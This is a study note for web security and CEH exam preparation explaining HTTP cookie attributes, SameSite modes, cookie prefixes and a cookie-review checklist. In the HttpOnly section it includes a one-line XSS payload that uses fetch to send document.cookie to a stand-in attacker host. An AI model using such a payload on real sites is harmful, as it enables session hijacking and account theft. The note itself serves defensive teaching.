---
title: HTTP Cookie Attributes
aliases:
  - Cookie Attributes
  - HTTP Cookies
  - Session Cookies
tags:
  - WebSecurity
  - Cookies
  - HTTP
  - Authentication
  - SessionManagement
  - OWASP
  - BugBounty
  - CEH
created: 2026-07-30
---

# 🍪 HTTP Cookie Attributes

> [!info]
> **Cookie attributes** define **how browsers store, send, and protect cookies**.
>
> Properly configured cookie attributes help protect against:
>
> - Session Hijacking
> - Cross-Site Scripting (XSS)
> - Cross-Site Request Forgery (CSRF)
> - Session Fixation
> - Information Disclosure

---

# 📖 What is a Cookie?

A **cookie** is a small piece of data sent by a web server to a browser.

Example:

```http
HTTP/1.1 200 OK

Set-Cookie: SESSIONID=abc123
```

The browser stores it.

Every future request includes:

```http
GET /dashboard HTTP/1.1

Cookie: SESSIONID=abc123
```

The server recognizes the user based on the cookie.

---

# 🏗 Cookie Flow

```text
User Login
      │
      ▼
Server Creates Session
      │
      ▼
Set-Cookie
      │
      ▼
Browser Stores Cookie
      │
      ▼
Every Request
      │
      ▼
Cookie Sent Back
      │
      ▼
Server Identifies User
```

---

# Anatomy of a Cookie

Example

```http
Set-Cookie:

SESSIONID=abc123;

Expires=Wed, 31 Dec 2026 23:59:59 GMT;

Max-Age=3600;

Domain=example.com;

Path=/;

Secure;

HttpOnly;

SameSite=Lax
```

Let's understand each attribute.

---

# 1️⃣ Name

The cookie identifier.

Example

```text
SESSIONID=abc123
```

Name

```text
SESSIONID
```

Examples

```text
PHPSESSID
JSESSIONID
ASP.NET_SessionId
token
remember_me
```

Real-world examples

Netflix

```text
sessionid=H7s83Ks...
```

Amazon

```text
session-id=123456
```

---

# 2️⃣ Value

The actual information stored.

Example

```text
SESSIONID=abc123xyz
```

Value

```text
abc123xyz
```

Cookies may contain:

- Session ID
- JWT
- User ID
- Theme
- Language
- Preferences

Example

```text
theme=dark
```

---

# 3️⃣ Expires

Defines **the exact date and time** the cookie expires.

Example

```http
Expires=Wed, 31 Dec 2026 23:59:59 GMT
```

After that time,

the browser automatically deletes the cookie.

---

## Session Cookie

If **Expires** is not present,

the cookie becomes a **Session Cookie**.

```text
Browser Closed
        │
        ▼
Cookie Deleted
```

Common example:

Internet banking websites.

---

# 4️⃣ Max-Age

Defines the cookie lifetime in **seconds**.

Example

```http
Max-Age=3600
```

Meaning

```text
3600 Seconds

↓

1 Hour
```

---

## Expires vs Max-Age

| Expires | Max-Age |
|----------|----------|
| Uses Date | Uses Seconds |
| Fixed Expiration | Relative Lifetime |

---

# 5️⃣ Domain

Defines which domains receive the cookie.

Example

```http
Domain=example.com
```

Cookie sent to:

```
example.com
shop.example.com
blog.example.com
mail.example.com
```

Without Domain:

Only

```
www.example.com
```

receives it.

---

## Security Risk

Example

```http
Domain=.example.com
```

All subdomains receive the cookie.

```text
example.com
│
├── shop.example.com
├── blog.example.com
├── mail.example.com
```

If one subdomain is compromised,

the attacker may obtain the cookie.

---

# 6️⃣ Path

Controls which URL paths receive the cookie.

Example

```http
Path=/admin
```

Cookie sent to

```
/admin
/admin/users
/admin/settings
```

Not sent to

```
/
/shop
/products
```

---

If

```http
Path=/
```

the cookie is sent everywhere.

---

# 7️⃣ Secure

One of the most important attributes.

Example

```http
Secure
```

Meaning

Cookie sent only over

```
HTTPS ✅

HTTP ❌
```

---

## Without Secure

```text
User
   │
HTTP Connection
   │
Cookie Travels
   │
Attacker Sniffs Traffic
   │
Session Cookie Stolen
```

---

# Real-World Example

Public Wi-Fi

```
Victim
    │
HTTP Website
    │
Cookie Sent
    │
Attacker Captures Cookie
    │
Session Hijacking
```

---

# 8️⃣ HttpOnly

Prevents JavaScript from reading the cookie.

Example

```http
HttpOnly
```

JavaScript

```javascript
document.cookie
```

Cannot access HttpOnly cookies.

---

## Without HttpOnly

An XSS vulnerability may read cookies.

Example

```javascript
fetch(
"https://attacker.com/?c="
+ document.cookie
)
```

Cookie may be stolen.

---

## Important Note

> [!note]

**HttpOnly does NOT stop XSS.**

It only prevents JavaScript from reading cookies.

The browser will still automatically send HttpOnly cookies with legitimate requests.

---

# HttpOnly Flow

Without HttpOnly

```text
XSS
 │
 ▼
Reads Cookie
 │
 ▼
Session Hijacking
```

With HttpOnly

```text
XSS
 │
 ▼
Cannot Read Cookie
```

---

# 9️⃣ SameSite

Protects against **Cross-Site Request Forgery (CSRF).**

Three values exist.

---

## SameSite=Strict

Most secure.

Cookie sent only during same-site navigation.

```
example.com

↓

example.com/profile

Cookie Sent ✅
```

From another site

```
evil.com

↓

example.com

Cookie NOT Sent ❌
```

---

## SameSite=Lax

Modern browser default.

Cookie is generally sent for:

- Normal link clicks
- Address bar navigation

Not sent for many cross-site background requests.

Provides a good balance between usability and security.

---

## SameSite=None

Cookie sent for cross-site requests.

Must also include

```http
Secure
```

Otherwise,

modern browsers reject the cookie.

Common use cases:

- Third-party login
- Embedded widgets
- Cross-site integrations

---

# CSRF Example

Without SameSite

```text
Victim Logged In

↓

Visits Attacker Site

↓

Hidden Form Submitted

↓

Browser Sends Cookie

↓

Action Performed
```

With

```http
SameSite=Strict
```

```text
Cookie NOT Sent

↓

Attack Prevented
```

---

# 🔟 Cookie Prefixes

Modern browsers support special cookie prefixes.

---

## __Secure-

Example

```http
Set-Cookie:

__Secure-session=abc;

Secure
```

Rules

- HTTPS required
- Secure required

---

## __Host-

Even stronger.

Example

```http
Set-Cookie:

__Host-session=abc;

Secure;

Path=/
```

Rules

- Secure required
- Path=/ required
- Domain attribute NOT allowed

Provides stronger protection against certain cookie injection attacks.

---

# Secure Cookie Example

```http
Set-Cookie:

SESSIONID=abc123;

Path=/;

Secure;

HttpOnly;

SameSite=Strict;

Max-Age=1800
```

Meaning

- Valid for 30 minutes
- HTTPS only
- JavaScript cannot read it
- Helps protect against CSRF
- Available across the site

---

# Cookie Attributes Summary

| Attribute | Purpose | Security Benefit |
|------------|---------|------------------|
| Name | Cookie identifier | Identifies cookie |
| Value | Stored information | Session ID, preferences |
| Expires | Expiration date | Automatic deletion |
| Max-Age | Lifetime in seconds | Automatic deletion |
| Domain | Allowed domains | Limits where cookie is sent |
| Path | Allowed paths | Reduces cookie exposure |
| Secure | HTTPS only | Protects against interception over HTTP |
| HttpOnly | Blocks JavaScript access | Helps mitigate cookie theft via XSS |
| SameSite | Restricts cross-site requests | Helps mitigate CSRF |
| __Secure- | Secure prefix | Requires HTTPS and Secure |
| __Host- | Strongest prefix | Prevents certain cookie injection attacks |

---

# Cookie Attributes in Burp Suite

Captured response

```http
HTTP/1.1 200 OK

Set-Cookie:

PHPSESSID=a9d2d9f9;

Path=/;

Secure;

HttpOnly;

SameSite=Lax
```

---

# Penetration Testing Checklist

When reviewing cookies, check for:

- ❌ Missing `Secure`
- ❌ Missing `HttpOnly`
- ❌ Missing or weak `SameSite`
- ❌ Overly broad `Domain` (e.g., `.example.com`)
- ❌ Overly broad `Path` (e.g., `/` when unnecessary)
- ❌ Sensitive information stored directly in cookies

---

# Common Misconfigurations

| Misconfiguration | Possible Risk |
|------------------|---------------|
| Missing Secure | Session Hijacking |
| Missing HttpOnly | Cookie theft via XSS |
| Missing SameSite | CSRF |
| Broad Domain | Cross-subdomain attacks |
| Broad Path | Unnecessary cookie exposure |
| Sensitive data stored in cookie | Information Disclosure |

---

# Easy Memory Trick

> [!tip]

Imagine an employee ID card.

- 🍪 Cookie = Employee ID card
- 🔒 Secure = Works only at the secure entrance (HTTPS)
- 🚫 HttpOnly = Employees cannot photocopy the secret barcode using JavaScript
- 🛡 SameSite = Outsiders cannot trick security into using your ID card on another site
- ⏰ Expires / Max-Age = The ID card automatically expires
- 🏢 Domain = Which office branches accept the card
- 🚪 Path = Which departments inside the office can use the card

---

# CEH Exam Definition

> **HTTP Cookie Attributes** are directives included in the `Set-Cookie` header that control how cookies are stored, transmitted, and protected by the browser. Proper configuration strengthens session management and helps mitigate attacks such as Session Hijacking, XSS-related cookie theft, CSRF, and certain cookie injection issues.

---

# Related Notes

- [[Session Hijacking]]
- [[Session Fixation]]
- [[Improper Session Management]]
- [[CSRF]]
- [[Cross-Origin Resource Sharing]]
- [[JWT]]
- [[Burp Suite]]
- [[OWASP Top 10 2025]]

---

# Key Takeaways

> [!summary]

- Cookies maintain user sessions between requests.
- **Secure** protects cookies during network transmission by limiting them to HTTPS.
- **HttpOnly** prevents JavaScript from reading cookies but does not stop XSS itself.
- **SameSite** helps mitigate CSRF by controlling when cookies are sent with cross-site requests.
- **Domain** and **Path** determine the scope of where cookies are sent.
- **Expires** and **Max-Age** control cookie lifetime.
- Reviewing cookie attributes is a fundamental step during web application security assessments.